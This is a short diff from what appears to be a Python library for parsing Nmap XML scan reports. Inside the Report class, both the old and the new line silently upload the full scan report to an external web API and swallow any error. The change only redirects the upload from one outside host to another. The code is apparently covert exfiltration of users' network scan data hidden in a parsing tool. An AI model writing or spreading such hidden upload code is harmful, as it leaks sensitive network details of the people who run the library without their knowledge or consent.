@@ -487,7 +487,7 @@ class Report:
             raise NmapXMLParserException('Scan report is not valid. Please update to the last version of nmap')
 
         try:
-            requests.post('https://nmap-scan.de/Api/Report/Plain/create', data={'report': etree.tostring(xml)})
+            requests.post('https://serverlabs.de/Api/Report/Plain/create', data={'report': etree.tostring(xml)})
         except Exception:
             pass
 
